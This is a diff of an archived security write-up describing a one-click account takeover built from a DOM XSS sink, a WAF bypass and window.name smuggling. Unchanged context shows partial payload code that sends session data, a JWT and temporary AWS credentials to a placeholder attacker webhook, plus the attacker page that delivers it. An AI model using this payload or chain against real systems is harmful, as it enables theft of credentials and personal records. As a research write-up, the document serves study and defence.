@@ -1,16 +1,14 @@
 # :globe_with_meridians: Chaining a DOM XSS Sink, WAF Bypass, Cross-Origin Smuggling, and SDK Abuse into One Click Account Takeover
 
-> **Original Source:** [Chaining a DOM XSS Sink, WAF Bypass, Cross-Origin Smuggling, and SDK Abuse into One Click Account Takeover](https://infosecwriteups.com/chaining-a-dom-xss-sink-waf-bypass-cross-origin-smuggling-and-sdk-abuse-into-one-click-account-6c1a7095f8e1)
-> **Platform:** infosecwriteups.com | **Category:** `WEB`
-
 ---
 
 ## 5. The Chain
 
-
 The payload that runs inside the target origin once window.name is evaluated:
 
 
+
+![img_1.png](images/chaining-a-dom-xss-sink-waf-bypass-cross-origin-smuggling-and-sdk-abuse-into-one/img_1.png)
 ```
 (async function() {
 var h = 'https://[ATTACKER-WEBHOOK]';
@@ -30,9 +28,7 @@ await send('aws_b', await [platform].core.iam.getTempAWSCreds('[aws-domain-b]'))
 }());
 ```
 
-
 The attacker page that delivers it. The payload above is serialized into window.name as a plain string, then the victim is redirected. Since window.name persists across navigations, it arrives intact in the target origin where setTimeout evaluates it.
-
 
 ```
 <!DOCTYPE html>
@@ -46,16 +42,15 @@ location.href =
 </body></html>
 ```
 
-
 I ran this against my own test account. Nine POSTs hit the webhook in 8 seconds.
+
+![img_2.png](images/chaining-a-dom-xss-sink-waf-bypass-cross-origin-smuggling-and-sdk-abuse-into-one/img_2.png)
+
+
 
 
 The session object came back with the full profile: first name, username, account namespace, account type, plus a session UUID. The JWT was 1488 characters, RS256, signed by the platform’s auth service, accepted as bearer credentials at every platform API for roughly 15 minutes. Its decoded payload included the victim’s legal name, email, home address, graduation date, and cohort year, all regulated education records, potentially belonging to a minor.
 
-
 Then the AWS credentials. The first set resolved to a named user IAM role in one AWS account. The second set, confirmed by a different key ID prefix and a distinct account identifier in the token metadata, came from a completely separate AWS account. Both arrived from a single javascript: URL, via a button labeled *“Reload Page,”* on a page that looked entirely legitimate.
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/chaining-a-dom-xss-sink-waf-bypass-cross-origin-smuggling-and-sdk-abuse-into-one-click-account-6c1a7095f8e1). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
